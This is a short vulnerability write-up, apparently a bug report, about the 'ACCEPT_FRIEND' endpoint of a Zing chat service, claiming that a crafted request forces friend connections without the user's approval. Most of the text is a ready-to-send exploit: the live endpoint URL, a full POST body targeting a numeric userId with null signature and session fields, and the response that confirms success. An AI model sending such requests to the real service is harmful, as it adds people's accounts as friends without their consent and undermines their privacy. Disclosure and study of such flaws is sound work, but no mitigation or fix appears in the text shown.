## Details

### Affected API
- **Endpoint**: `ACCEPT_FRIEND`  
  **URL**: `https://friend.talk.zing.vn/api/friend/accept`

### Exploit
By sending a crafted POST request to the `ACCEPT_FRIEND` endpoint with specific parameters, attackers could force a friend connection without user approval.  

Example POST request:
```http
POST https://friend.talk.zing.vn/api/friend/accept
Content-Type: application/json

{
  "actiontime": 1,
  "api_key": "NULL",
  "avatarSize": 120,
  "clientType": 1,
  "session_key": "NULL",
  "sign": "NULL",
  "ts": "NULL",
  "userId": 397726729,
  "sig": "NULL"
}
```

If the server returns:
```json
{
  "code": 0
}
```
It means the friend request was successfully accepted.
